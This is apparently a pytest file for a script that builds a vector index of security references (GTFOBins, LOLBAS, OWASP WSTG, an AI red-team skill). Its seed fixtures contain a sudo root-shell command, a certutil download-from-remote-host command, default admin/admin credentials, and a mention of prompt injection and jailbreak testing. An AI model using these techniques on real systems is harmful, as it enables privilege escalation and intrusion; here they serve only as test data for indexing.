from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

from core import kb as kb_mod
from core import vector_store as vector_mod

_BK_PATH = Path(__file__).resolve().parent.parent / "scripts" / "build_kb.py"
_spec = importlib.util.spec_from_file_location("build_kb", _BK_PATH)
build_kb = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(build_kb)


@pytest.fixture
def kb_env(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(kb_mod, "KB_ROOT", tmp_path / "kb")
    monkeypatch.setattr(kb_mod, "SOURCES_DIR", tmp_path / "kb" / "sources")
    monkeypatch.setattr(kb_mod, "RAW_DIR", tmp_path / "kb" / "sources" / "_raw")
    monkeypatch.setattr(kb_mod, "MANIFEST", tmp_path / "kb" / "MANIFEST.json")
    monkeypatch.setattr(vector_mod, "VECTOR_ROOT", tmp_path / "vectors")
    monkeypatch.setattr(vector_mod, "KB_ROOT", tmp_path / "kb")
    monkeypatch.setattr(vector_mod, "RAW_DIR", tmp_path / "kb" / "sources" / "_raw")
    monkeypatch.setattr(vector_mod, "MANIFEST", tmp_path / "kb" / "MANIFEST.json")
    (tmp_path / "kb" / "sources" / "_raw").mkdir(parents=True)
    return tmp_path


def _seed_light_sources(tmp_path: Path):
    raw = kb_mod.RAW_DIR
    g = raw / "gtfobins" / "_gtfobins"
    g.mkdir(parents=True)
    (g / "sudo").write_text(
        "---\nfunctions:\n  shell:\n    - code: 'sudo /bin/sh'\n      contexts:\n        sudo: null\n        suid: null\ndescription: sudo root shell\n",
        encoding="utf-8",
    )
    l = raw / "lolbas" / "_lolbas" / "Binaries"
    l.mkdir(parents=True)
    (l / "Certutil.md").write_text(
        "---\nName: Certutil.exe\nDescription: Download a file from the internet\nCommands:\n  - Command: 'certutil -urlcache -f http://x/f file'\n    Description: Download a file\n    Category: Download\n    MitreID: T1105\n---\n",
        encoding="utf-8",
    )
    w = raw / "wstg" / "4.0" / "4-Web_Application_Security_Testing"
    w.mkdir(parents=True)
    (w / "04-Testing_for_Default_Credentials.md").write_text(
        "# Testing for Default Credentials\n\nWSTG-ATHN-02 default credentials admin admin for login pages." + ("x" * 220),
        encoding="utf-8",
    )
    sk = Path("skills") / "ai" / "ai-redteam"
    sk.mkdir(parents=True)
    (sk / "SKILL.md").write_text("# AI/LLM Red-Team Assessment\n\nprompt injection jailbreak system prompt\n", encoding="utf-8")


def test_offline_build_index_query_status_selftest(kb_env, capsys):
    _seed_light_sources(kb_env)
    assert build_kb.build(["skill_refs", "gtfobins", "lolbas", "wstg"], refresh=False, offline=True) == 0
    docs = vector_mod.list_docs(vector_mod.STATIC_SECURITY_VAULT)
    assert docs
    assert any(d["kind"] == "gtfobins" for d in docs)
    assert json.loads(kb_mod.MANIFEST.read_text())["gtfobins"]["docs"] >= 1
    assert build_kb.status() == 0
    assert "vector vault" in capsys.readouterr().out.lower()
    assert build_kb.selftest() == 0


def test_build_offline_missing_cache_skips(kb_env, capsys):
    assert build_kb.build(["gtfobins"], refresh=False, offline=True) == 0
    assert "skip" in capsys.readouterr().out.lower()


def test_main_status(kb_env, monkeypatch):
    monkeypatch.setattr(build_kb.sys, "argv", ["build_kb.py", "--status"])
    assert build_kb.main() == 0


def test_main_selftest_no_index(kb_env, monkeypatch):
    monkeypatch.setattr(build_kb.sys, "argv", ["build_kb.py", "--selftest"])
    assert build_kb.main() == 1
